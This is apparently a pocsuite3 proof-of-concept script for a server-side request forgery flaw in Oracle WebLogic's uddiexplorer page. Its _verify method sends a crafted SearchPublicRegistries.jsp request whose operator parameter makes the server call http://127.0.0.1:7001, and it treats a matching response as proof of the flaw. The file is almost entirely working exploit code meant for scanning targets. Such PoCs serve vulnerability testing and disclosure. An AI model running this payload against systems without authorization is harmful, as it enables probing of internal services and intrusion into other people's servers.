#!/usr/bin/env python
#_*_ encoding: utf-8 _*_
from pocsuite3.api import register_poc
from pocsuite3.api import requests
from pocsuite3.api import Output
from pocsuite3.api import logger
from pocsuite3.api import POCBase

class Weblogic(POCBase):
    vulID = 'N/A'
    version = '1.0'
    author = 'big04dream'
    vulDate = ''
    createDate = '2019-11-06'
    updateDate = '2019-11-06'
    references = ['']
    name = 'Weblogic uddiexplorer SSRF'
    appPowerLink = ''
    appName = 'Weblogic'
    appVersion = 'all'
    vulType = 'Weblogic uddiexplorer SSRF'
    desc = ''' 
    Weblogic uddiexplorer SSRF
    '''

    @property
    def _headers(self):
        headers = {
            'Content-Type': 'text/xml',
            'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; WOW64; rv:56.0) Gecko/20100101 Firefox/56.0',
            'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8',
            'Accept-Language': 'zh-CN,zh;q=0.8,en-US;q=0.5,en;q=0.3',
        }
        return headers

    def _verify(self):
        result = {}
        payload = 'uddiexplorer/SearchPublicRegistries.jsp?rdoSearch=name&txtSearchname=sdf&txtSearchkey=&txtSearchfor=&selfor=Business+location&btnSubmit=Search&operator=http://127.0.0.1:7001'
        try:
            if self.url[-1] == '/':
                url = self.url + payload
            else:
                url = self.url + '/' + payload
            res = requests.get(
                url = url,
                headers = self.headers,
                timeout = 5
            )
            if res.status_code == 200 and 'Oracle WebLogic Server' in res.text:
                result['VerifyInfo'] = {}
                result['VerifyInfo']['URL'] = url
                result['VerifyInfo']['Payload'] = payload
        except Exception as e:
            logger.info(e)
        return self.parse_output(result)

    def _attack(self):
        return self._verify()

    def parse_output(self, result):
        output = Output(self)
        if result:
            output.success(result)
        else:
            output.fail('Not vulnerability')
        return output

register_poc(Weblogic)